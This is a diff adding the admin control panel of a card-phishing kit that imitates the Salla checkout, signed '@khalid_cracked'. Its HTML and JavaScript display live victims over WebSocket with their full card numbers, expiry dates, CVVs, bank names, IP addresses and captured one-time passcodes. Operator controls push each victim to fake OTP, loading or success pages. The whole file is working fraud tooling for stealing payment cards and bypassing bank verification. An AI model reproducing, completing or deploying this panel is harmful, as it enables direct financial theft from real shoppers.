@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Salla - Admin Control Panel</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #e5e5e5;
+        }
+
+        .blink-bg {
+            animation: blinker 2s linear infinite;
+        }
+
+        @keyframes blinker {
+            50% {
+                background-color: rgba(16, 185, 129, 0.2);
+            }
+        }
+    </style>
+</head>
+
+<body class="p-6">
+    <div class="max-w-7xl mx-auto">
+        <div class="flex justify-between items-center mb-6">
+            <h1 class="text-3xl font-bold text-gray-800">Salla Control <a href="#"
+                    class="text-blue-500 text-sm">@khalid_cracked</a></h1>
+            <div class="flex gap-4">
+                <div class="px-4 py-2 bg-white rounded shadow text-sm">
+                    Clients Online: <span id="onlineCount" class="font-bold text-green-600">0</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Live Clients Table -->
+        <div class="bg-white rounded-xl shadow-lg overflow-hidden mb-8">
+            <div class="px-6 py-4 border-b border-gray-100 bg-gray-50 flex justify-between">
+                <h2 class="text-lg font-bold text-gray-700">Live Traffic Monitor</h2>
+                <span class="text-xs text-gray-400 self-center">Real-time updates via WebSocket</span>
+            </div>
+            <div class="overflow-x-auto">
+                <table class="w-full text-left text-sm whitespace-nowrap">
+                    <thead class="bg-gray-50 text-gray-500 uppercase font-medium">
+                        <tr>
+                            <th class="px-6 py-3">Status</th>
+                            <th class="px-6 py-3">Client Info</th>
+                            <th class="px-6 py-3">Current Step</th>
+                            <th class="px-6 py-3">Card / Details</th>
+                            <th class="px-6 py-3">CVC / OTP</th>
+                            <th class="px-6 py-3 text-center">Controls</th>
+                        </tr>
+                    </thead>
+                    <tbody id="clientsTable" class="divide-y divide-gray-100">
+                        <!-- Rows rendered via JS -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Completed Orders -->
+        <h2 class="text-xl font-bold text-gray-800 mb-4">Completed / SMS Captured</h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6" id="historyCards">
+            <!-- Cards rendered here -->
+        </div>
+
+    </div>
+
+    <!-- Audio Notification -->
+    <audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
+
+    <script>
+        // Use relative URL for WS if on API domain, or modify if cross-domain
+        const host = window.location.host;
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const wsUrl = `${protocol}//${host}/ws/admin`;
+
+        // --- Logic Identique au précédent ---
+        let clientData = {};
+
+        function playSound() { document.getElementById('notifSound').play().catch(() => { }); }
+
+        const ws = new WebSocket(wsUrl);
+        ws.onopen = () => console.log('Admin Connected');
+        ws.onmessage = (e) => {
+            const msg = JSON.parse(e.data);
+            handleMessage(msg);
+        };
+
+        function handleMessage(msg) {
+            if (msg.type === 'NEW_PAYMENT' || msg.type === 'NEW_SMS') { playSound(); fetchHistory(); }
+
+            if (msg.type === 'CLIENT_STATUS') {
+                if (!clientData[msg.client_id]) clientData[msg.client_id] = {};
+                clientData[msg.client_id].status = msg.status;
+                updateTable();
+            }
+
+            if (msg.type === 'CLIENT_EVENT') {
+                const cid = msg.client_id;
+                if (!clientData[cid]) clientData[cid] = { status: 'online' };
+                if (msg.event === 'step_update') clientData[cid].step = msg.data.step;
+                if (msg.event === 'timer_update') clientData[cid].timer = msg.data.time;
+                updateTable();
+            }
+        }
+
+        async function fetchHistory() {
+            try {
+                const res = await fetch('/v1/admin/history');
+                const data = await res.json();
+                renderHistory(data);
+                data.payments.forEach(p => { if (clientData[p.client_id]) clientData[p.client_id].payment = p; });
+                updateTable();
+            } catch (e) { console.error(e); }
+        }
+
+        function renderHistory(db) {
+            const container = document.getElementById('historyCards');
+            container.innerHTML = '';
+            // Newest first by default from API?
+            db.payments.forEach(p => {
+                const sms = db.sms.filter(s => s.client_id === p.client_id);
+                let otpHtml = sms.map(s => `<span class="bg-yellow-100 text-yellow-800 text-xs px-2 py-1 rounded font-mono">${s.otp}</span>`).join(' ');
+                const cardHtml = `
+                    <div class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 relative">
+                        <div class="flex justify-between items-start mb-4">
+                            <div><span class="text-xs text-gray-400 block">${new Date(p.timestamp).toLocaleString()}</span><h3 class="font-bold text-gray-800">${p.full_name}</h3></div>
+                            <span class="px-2 py-1 ${p.status === 'confirmed' ? 'bg-green-100 text-green-700' : 'bg-blue-50 text-blue-600'} text-xs rounded-full uppercase font-bold">${p.status}</span>
+                        </div>
+                        <div class="space-y-2 mb-4">
+                            <div class="flex justify-between text-sm"><span class="text-gray-500">Card</span><span class="font-mono font-bold">${p.numero_carte}</span></div>
+                            <div class="flex justify-between text-sm"><span class="text-gray-500">Exp / CVV</span><span class="font-mono">${p.expiry} / <span class="text-red-500 font-bold">${p.cvv}</span></span></div>
+                            <div class="flex justify-between text-sm"><span class="text-gray-500">Bank</span><span>${p.bank_name || 'N/A'}</span></div>
+                            ${otpHtml ? `<div class="mt-2 pt-2 border-t border-gray-50"><span class="text-xs text-gray-400 block">Captured OTPs</span><div class="flex gap-1 mt-1">${otpHtml}</div></div>` : ''}
+                        </div>
+                    </div>
+                `;
+                container.innerHTML += cardHtml;
+            });
+        }
+
+        function updateTable() {
+            const tbody = document.getElementById('clientsTable');
+            tbody.innerHTML = '';
+            let online = 0;
+            Object.keys(clientData).forEach(cid => {
+                const c = clientData[cid];
+                if (c.status === 'online') online++;
+                let stepBadge = `<span class="px-2 py-1 bg-gray-100 text-gray-500 text-xs rounded">Unknown</span>`;
+                if (c.step === 'checkout_gulf') stepBadge = `<span class="px-2 py-1 bg-blue-100 text-blue-700 text-xs rounded font-bold">💳 Checkout</span>`;
+                if (c.step === 'loading') stepBadge = `<span class="px-2 py-1 bg-yellow-100 text-yellow-700 text-xs rounded font-bold animate-pulse">⏳ Loading (${c.timer || '0'}s)</span>`;
+                if (c.step === 'otp') stepBadge = `<span class="px-2 py-1 bg-purple-100 text-purple-700 text-xs rounded font-bold">🔒 OTP Input</span>`;
+                if (c.step === 'thank_you') stepBadge = `<span class="px-2 py-1 bg-green-100 text-green-700 text-xs rounded font-bold">✅ Success</span>`;
+
+                const row = `
+                    <tr class="hover:bg-gray-50 transition-colors ${c.status === 'offline' ? 'opacity-50 grayscale' : ''}">
+                        <td class="px-6 py-4"><span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium ${c.status === 'online' ? 'bg-green-100 text-green-800' : 'bg-gray-100 text-gray-800'}">${c.status === 'online' ? '<span class="w-2 h-2 rounded-full bg-green-500"></span>' : ''} ${c.status}</span></td>
+                        <td class="px-6 py-4"><span class="block font-mono text-xs text-gray-500">${cid}</span><span class="block text-xs text-gray-400 truncate w-32">${c.payment?.adresse_ip || 'IP Hidden'}</span></td>
+                        <td class="px-6 py-4">${stepBadge}</td>
+                        <td class="px-6 py-4">${c.payment ? `<div class="text-xs"><div class="font-bold text-gray-800">${c.payment.numero_carte}</div><div class="text-gray-500">${c.payment.bank_name || ''}</div></div>` : '<span class="text-gray-400 text-xs border border-dashed border-gray-300 px-2 py-1 rounded">No Data</span>'}</td>
+                        <td class="px-6 py-4 text-xs font-mono">${c.payment ? `<span class="text-red-500 font-bold">CVV: ${c.payment.cvv}</span>` : ''}</td>
+                        <td class="px-6 py-4 text-center">
+                            <div class="flex justify-center gap-2">
+                                <select onchange="redirectClient('${cid}', this.value)" class="text-xs border border-gray-300 rounded px-2 py-1 bg-white hover:border-blue-500 focus:outline-none">
+                                    <option value="" disabled selected>⚡ Redirect...</option>
+                                    <option value="otp.html">➡ To OTP</option>
+                                    <option value="checkout_gulf.html">➡ To Checkout</option>
+                                    <option value="success.html">➡ To Success</option>
+                                    <option value="loading.html">➡ To Loading</option>
+                                    <option value="https://facebook.com">➡ To FB App</option>
+                                </select>
+                                <button onclick="banClient('${cid}')" class="p-1 px-2 bg-red-50 text-red-600 rounded hover:bg-red-100 border border-red-200 text-xs font-bold" title="Ban Client">🚫 Ban</button>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+                tbody.innerHTML += row;
+            });
+            document.getElementById('onlineCount').textContent = online;
+        }
+
+        async function redirectClient(cid, target) {
+            if (!target) return;
+            // Si c'est un lien externe (FB), on utilise l'endpoint Ban? Non, redirect gère l'url absolu si configuré ou on passe l'url brute.
+            // Notre backend gère 'target' comme fin de chemin sauf si http.
+            await fetch('/v1/admin/redirect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ client_id: cid, target: target })
+            });
+        }
+
+        async function banClient(cid) {
+            if (confirm('Ban this client?')) {
+                await fetch('/v1/admin/ban?client_id=' + cid, { method: 'POST' });
+            }
+        }
+
+        fetchHistory();
+        setInterval(fetchHistory, 5000);
+    </script>
+</body>
+
+</html>
